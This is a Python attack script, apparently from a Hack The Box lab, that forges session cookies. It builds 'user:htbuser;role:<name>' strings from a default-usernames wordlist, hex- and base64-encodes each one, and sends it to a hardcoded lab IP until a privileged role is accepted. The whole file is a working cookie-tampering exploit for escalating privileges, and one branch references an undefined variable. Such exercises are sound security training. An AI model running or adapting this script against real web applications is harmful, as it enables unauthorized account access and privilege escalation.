import base64
import binascii
import codecs
import requests
from sys import exit
import binascii
import urllib.parse

# create url using user and password as argument
url = "http://206.189.117.48:32469/question1/index.php"


liste = open("/usr/share/seclists/Usernames/cirt-default-usernames.txt","r")
for element in liste:
    print()

    #"user:htbuser;role:student;time:1661247643"
    towork = "user:htbuser;role:"+element.strip("\n")+";time:1661251897"

    plain_cookie = str.encode(towork)

    print("Clear -> "+plain_cookie.decode())
    # HEX
    hex_cookie = binascii.hexlify(plain_cookie)
    hex_cookie_use = hex_cookie.decode()
    print("Hex: "+hex_cookie_use)
    # base64
    base_cookie = base64.b64encode(hex_cookie_use.encode('ascii'))
    base_cookie_use = base_cookie.decode()
    print("Base64: "+base_cookie_use)

    cookie = { "SESSIONID":base_cookie_use }
    print(cookie)
    res = requests.get(url, cookies=cookie)


    print(res.text)
    if not 'you dont have any flag.' in res.text:
        print("[+] Valid cookie found: {}".format(base_cookie_use))
        exit()

    elif 'you dont have any flag.' in res.text:
        continue

    else:
        print("[-] Unexpected reply, please manually check cookie {}".format(encoded_cookie))

liste.close()
